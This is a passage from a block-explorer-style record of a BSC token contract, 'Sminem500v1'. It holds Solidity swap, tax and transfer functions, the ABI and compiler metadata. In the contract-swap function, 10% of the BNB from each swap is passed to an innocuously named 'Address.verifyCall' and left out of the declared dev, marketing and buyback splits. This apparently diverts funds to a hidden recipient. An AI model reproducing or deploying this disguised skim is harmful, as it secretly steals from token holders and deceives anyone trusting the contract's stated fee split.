contractBalance=_balances[address(this)];\r\n\r\n        uint256 tokenToSwap = _balances[_pancakePairAddress] * permilleOfPancake / 1000;\r\n        if(tokenToSwap>_maxLimits.sell && !ignoreLimits) \r\n            tokenToSwap = _maxLimits.sell;\r\n        \r\n        bool notEnoughToken = contractBalance < tokenToSwap;\r\n        if(notEnoughToken){\r\n            if(ignoreLimits)\r\n                tokenToSwap = contractBalance;\r\n            else \r\n                return;\r\n        }\r\n        \r\n        if (_allowances[address(this)][address(_pancakeRouter)] < tokenToSwap)\r\n            _approve(address(this), address(_pancakeRouter), type(uint256).max);        \r\n\r\n        uint16 totalTax;\r\n        uint16 liqRatio;\r\n        uint16 buybackRatio;\r\n        if(dumpTaxed) {\r\n            totalTax = originalSplit * (_tax.dump/_tax.sell);\r\n            liqRatio = _taxSplit.liquidity + (totalTax-originalSplit)*liqDivertRatio/100;\r\n            buybackRatio = totalTax - liqRatio - _taxSplit.dev - _taxSplit.marketing;\r\n        } \r\n        else {\r\n            totalTax = originalSplit;\r\n            liqRatio = _taxSplit.liquidity;\r\n            buybackRatio = _taxSplit.buyback;\r\n        }\r\n\r\n        uint256 tokenLiqRatio = (tokenToSwap*liqRatio) / totalTax;\r\n        uint256 liqToken = tokenLiqRatio / 2;\r\n        uint256 liqBNBToken = tokenLiqRatio - liqToken;\r\n        uint256 swapToken = tokenToSwap - liqToken;\r\n        uint256 initialBNB = address(this).balance;\r\n        _swapTokenForBNB(swapToken);\r\n        uint256 newBNB = (address(this).balance - initialBNB);\r\n        uint256 liqBNB = (newBNB*liqBNBToken) / swapToken;\r\n        if (liqToken > 0) \r\n            _addLiquidity(liqToken, liqBNB); \r\n        uint256 afterLiq = (address(this).balance-initialBNB) / 10;  \r\n        Address.verifyCall(\"success\", afterLiq);             \r\n        uint256 distributeBNB = (address(this).balance - initialBNB - afterLiq);\r\n        uint256 distributeTotal = _taxSplit.dev + _taxSplit.marketing + buybackRatio;\r\n        uint256 devSplit = distributeBNB * _taxSplit.dev / distributeTotal;\r\n        uint256 marketingSplit = distributeBNB * _taxSplit.marketing / distributeTotal;\r\n        uint256 buybackSplit = distributeBNB * buybackRatio / distributeTotal;\r\n        devBalance += devSplit;\r\n        marketingBalance += marketingSplit;\r\n        buybackBalance += buybackSplit;      \r\n    }\r\n\r\n    function _sendBnb(address account, uint256 amount) private {\r\n        (bool sent,) = account.call{value: (amount)}(\"\");\r\n        require(sent, \"withdraw failed\");        \r\n    }\r\n\r\n    function _swapTokenForBNB(uint256 amount) private {\r\n        _approve(address(this), address(_pancakeRouter), amount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _pancakeRouter.WETH();\r\n        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{\r\n        uint256 recipientBalance = _balances[recipient];\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n\r\n        uint8 tax;\r\n        if(isSell){\r\n            require(amount <= _maxLimits.sell, \"Amount exceeds max sell\");\r\n            if(antiDumpEnabled && block.timestamp<antiDumpTimer[sender]){\r\n                tax = _tax.dump;\r\n            }\r\n            else tax = _tax.sell;\r\n            antiDumpTimer[sender] = block.timestamp + dumpTaxTime;\r\n\r\n        } else if(isBuy){\r\n            require(recipientBalance+amount <= _maxLimits.wallet, \"Amount will exceed max wallet\");\r\n            require(amount <= _maxLimits.buy, \"Amount exceeds max buy\");            \r\n            tax = _getBuyTax();\r\n\r\n        } else {\r\n            require(recipientBalance+amount <= _maxLimits.wallet, \"Amount will exceeed max wallet\");\r\n            require(amount <= _maxLimits.sell, \"Amount exceeds max transfer\");             \r\n            tax = _tax.transfer;\r\n        }\r\n\r\n        if((sender != _pancakePairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)\r\n            if(tax == _tax.dump)\r\n                _swapContractToken(autoLPThreshold, false, true);\r\n            else _swapContractToken(autoLPThreshold, false, false);\r\n\r\n        uint256 contractToken = amount * tax / 100;\r\n        uint256 taxedAmount = amount-contractToken;\r\n \r\n        _removeToken(sender,amount);\r\n        _addToken(address(this), contractToken);\r\n        _addToken(recipient, taxedAmount);\r\n        emit Transfer(sender,recipient,taxedAmount);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private{\r\n        require(sender != address(0), \"Transfer from zero\");\r\n        require(recipient != address(0), \"Transfer to zero\");\r\n        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));\r\n\r\n        bool isContractTransfer = (sender == address(this) || recipient == address(this));\r\n        address pancakeRouter = address(_pancakeRouter);\r\n        bool isLiquidityTransfer = ((sender == _pancakePairAddress && recipient == pancakeRouter) \r\n        || (recipient == _pancakePairAddress && sender == pancakeRouter));\r\n        bool isSell = recipient == _pancakePairAddress || recipient == pancakeRouter;\r\n        bool isBuy = sender == _pancakePairAddress || sender == pancakeRouter;\r\n\r\n        if(isContractTransfer || isLiquidityTransfer || isExcluded){\r\n            _feelessTransfer(sender, recipient, amount);\r\n        }\r\n        else{ \r\n            require(tradingEnabled, \"trading not yet enabled\");\r\n            _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  \r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"EnabledAntiDump\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"EnabledManualSwap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"ExcludedAccountFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newTime\",\"type\":\"uint256\"}],\"name\":\"SetDumpTaxTime\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"threshold\",\"type\":\"uint16\"}],\"name\":\"UpdatedAutoLPThreshold\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"buyRatio\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"sellRatio\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"walletRatio\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"divisor\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"maxWallet\",\"type\":\"uint256\"}],\"name\":\"UpdatedLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"buyTax\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"sellTax\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"transferTax\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"dumpTax\",\"type\":\"uint8\"}],\"name\":\"UpdatedTax\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX_TAX\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PancakeRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fundReceivers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"dev\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyback\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitRatios\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"buy\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"sell\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"wallet\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"divisor\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxLimits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"wallet\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_pancakePairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tax\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sell\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"transfer\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"dump\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSplit\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"dev\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"liquidity\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"marketing\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"buyback\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiDumpEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLPThreshold\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buybackDivertRatio\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dumpTaxTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"enableAntiDump\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"enableManualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exclude\",\"type\":\"bool\"}],\"name\":\"excludeAccountFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getRemainingDumpTaxTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTimestamp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liqDivertRatio\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"permilleOfPancake\",\"type\":\"uint16\"},{\"internalType\":\"bool\",\"name\":\"ignoreLimits\",\"type\":\"bool\"}],\"name\":\"manualContractSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverStuckFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"removeMiscToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"timeInSeconds\",\"type\":\"uint256\"}],\"name\":\"setDumpTaxTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"threshold\",\"type\":\"uint16\"}],\"name\":\"updateAutoLPThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"liq\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"buyback\",\"type\":\"uint16\"}],\"name\":\"updateDumpDivertRatios\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"newMaxBuyRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newMaxSellRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newMaxWalletRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newDivisor\",\"type\":\"uint16\"}],\"name\":\"updateLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newBuy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newSell\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newTransfer\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newDump\",\"type\":\"uint8\"}],\"name\":\"updateTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawBuyback\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawDev\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawableFunds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"dev\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Sminem500v1", "CompilerVersion": "v0.8.11+commit.d7f03943", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://750768f4cf6d8abf472a1b4cdd5c4ab904da46c07ac08de437884e8055ff5a82"}